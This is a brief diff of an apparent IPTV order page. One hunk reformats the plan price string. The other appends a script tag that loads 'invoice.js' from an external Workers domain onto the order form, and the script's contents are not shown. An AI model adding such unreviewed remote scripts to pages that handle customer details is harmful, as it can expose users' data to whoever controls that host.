@@ -500,7 +500,7 @@ function opSubmit(e) {
 
   var connInfo = currentConn === 1 ? '1 Connection' : currentConn + ' Connections';
   var priceInfo = OP_PRICES[currentConn] || '$9';
-  var planName = '1 Month - ' + connInfo + ' (' + priceInfo + ')';
+  var planName = '1 Month - ' + connInfo + ' ($' + String(priceInfo).replace('$', '') + ')';
   var emoji = '📦';
   var waMsg = emoji + ' NEW ORDER%0A%0A' +
     '📋 Plan: ' + encodeURIComponent(planName) + '%0A' +
@@ -657,5 +657,6 @@ function onCountryChange() {
 // Set initial dial code for Canada
 document.addEventListener("DOMContentLoaded",function(){onCountryChange();});
 </script>
+<script src="https://iptv-trial-mojo4ktv.medmaar.workers.dev/invoice.js" defer></script>
 </body>
 </html>
